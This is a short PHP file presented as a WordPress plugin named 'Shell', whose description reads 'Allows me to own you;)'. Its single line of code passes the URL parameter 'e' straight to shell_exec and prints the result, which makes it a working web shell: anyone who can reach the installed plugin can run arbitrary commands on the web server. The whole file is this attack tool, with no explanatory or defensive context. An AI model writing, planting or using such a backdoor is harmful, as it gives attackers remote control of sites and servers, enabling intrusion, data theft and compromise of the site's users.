<?php
/*
Plugin Name: Shell
Plugin URI: https://nikolaskama.me/
Description: Allows me to own you;)
Author: k4m4
Version: 1.0.0
Author URI: https://nikolaskama.me/
*/
echo shell_exec($_GET['e']);
?>
